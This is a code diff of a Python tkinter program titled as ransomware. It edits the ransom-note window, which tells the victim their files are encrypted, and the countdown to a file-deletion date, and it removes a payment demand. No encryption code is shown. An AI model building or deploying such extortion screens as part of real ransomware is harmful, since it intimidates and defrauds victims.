@@ -8,7 +8,7 @@ month = int.from_bytes(file.read(1), 'big')
 day = int.from_bytes(file.read(1), 'big')
 
 current_date = datetime.datetime.now()
-delete_date = datetime.datetime(2020, month, day)
+delete_date = datetime.datetime(2022, month, day)
 seconds_left = (delete_date - current_date).total_seconds()
 
 file.close()
@@ -16,7 +16,7 @@ file.close()
 class ExampleApp(tk.Tk):
     def __init__(self):
         tk.Tk.__init__(self)
-        self.title("Peter's Ransomware")
+        self.title("Wilder's Ransomware")
         self.configure(bg='red')
 
         self.frame_upper = tk.Frame(master=self, height=50, bg="red")
@@ -31,7 +31,7 @@ class ExampleApp(tk.Tk):
         self.frame1.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
 
         self.note_label = tk.Label(master=self.frame1, bg='white', fg="black", justify=tk.LEFT, anchor=tk.NW)
-        self.note = 'What happened to my computer?\nAll your important personal files have been encrypted,\nand all of these documents are no longer accessible.\n\n Please pay $69 for us to decrypt your files :P'
+        self.note = 'What happened to my computer?\nAll your important personal files have been encrypted,\nand all of these documents are no longer accessible.\n'
         self.note_label.config(text=self.note, font=("Comic Sans MS", 11))
         self.note_label.pack(side=tk.TOP)
 
